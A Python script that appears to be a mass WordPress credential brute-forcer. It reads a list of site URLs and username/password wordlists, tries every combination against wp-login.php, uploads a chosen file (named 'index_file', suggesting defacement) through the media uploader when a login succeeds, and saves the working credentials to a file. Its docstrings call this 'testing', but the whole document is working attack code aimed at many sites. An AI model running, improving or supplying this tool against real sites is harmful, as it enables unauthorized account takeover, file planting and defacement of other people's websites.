import requests
import os
import sys
from bs4 import BeautifulSoup
from requests.auth import HTTPBasicAuth

def load_file(file_path):
    """
    Loads a file and returns its lines as a list.
    Each line is stripped of extra whitespace.
    """
    if not os.path.exists(file_path):
        print(f"Error: File {file_path} not found.")
        sys.exit(1)

    with open(file_path, 'r', encoding='utf-8') as file:
        return [line.strip() for line in file.readlines()]


def attempt_login(url, username, password):
    """
    Attempts to login to the WordPress site with the given credentials.
    Returns True if login is successful, False otherwise.
    """
    login_url = f"{url}/wp-login.php"
    data = {'log': username, 'pwd': password}

    try:
        response = requests.post(login_url, data=data, timeout=10)
        response.raise_for_status()
        if "Dashboard" in response.text or "dashboard" in response.text:
            print(f"[+] Login successful for {username} at {url}")
            return True
        else:
            print(f"[-] Login failed for {username} at {url}")
    except requests.RequestException as e:
        print(f"[!] Error during login attempt: {e}")

    return False


def scrape_site_data(url):
    """
    Scrapes data from the WordPress site for testing purposes.
    Returns the page title and a list of links.
    """
    try:
        response = requests.get(url, timeout=10)
        response.raise_for_status()
        soup = BeautifulSoup(response.text, 'html.parser')

        # Extract the page title
        title = soup.title.string if soup.title else "No Title"
        
        # Extract all links from the page
        links = [a['href'] for a in soup.find_all('a', href=True)]
        
        print(f"[+] Scraped {len(links)} links from {url}")
        return title, links
    except requests.RequestException as e:
        print(f"[!] Error scraping {url}: {e}")
        return None, []


def upload_file(url, username, password, file_path):
    """
    Uploads a file to the WordPress site if login is successful.
    Returns True if the upload is successful, False otherwise.
    """
    if not os.path.exists(file_path):
        print(f"Error: File {file_path} not found.")
        return False

    if attempt_login(url, username, password):
        with open(file_path, 'rb') as file:
            files = {'file': (os.path.basename(file_path), file)}
            upload_url = f"{url}/wp-admin/media-new.php"

            try:
                response = requests.post(upload_url, files=files, auth=HTTPBasicAuth(username, password))
                if response.status_code == 200:
                    print(f"[+] File uploaded successfully to {url}")
                    return True
            except requests.RequestException as e:
                print(f"[!] Error during file upload: {e}")
    return False


def main():
    """
    Main function to orchestrate WordPress login, scraping, and file upload.
    """
    if len(sys.argv) < 4:
        print("Usage: python3 script.py <wp_list_file> <result_file> <index_file>")
        sys.exit(1)
    
    wp_list_file = sys.argv[1]
    result_file = sys.argv[2]
    index_file = sys.argv[3]

    wp_list = load_file(wp_list_file)
    usernames = load_file('usernames')
    passwords = load_file('passwords')

    success_results = []

    for wp_url in wp_list:
        for username in usernames:
            for password in passwords:
                print(f"[*] Trying {wp_url} with {username}/{password}")
                
                # Scrape site data for testing
                title, links = scrape_site_data(wp_url)
                print(f"[+] Site Title: {title}")
                
                # Attempt to upload file
                if upload_file(wp_url, username, password, index_file):
                    print(f"[+] Success: {wp_url} with {username}/{password}")
                    success_results.append(f"{wp_url} - {username}/{password}")
                    break
            else:
                continue
            break

    # Save successful results to a file
    with open(result_file, 'w', encoding='utf-8') as file:
        for result in success_results:
            file.write(result + "\n")
    
    print(f"[+] Results saved to {result_file}")

if __name__ == '__main__':
    main()
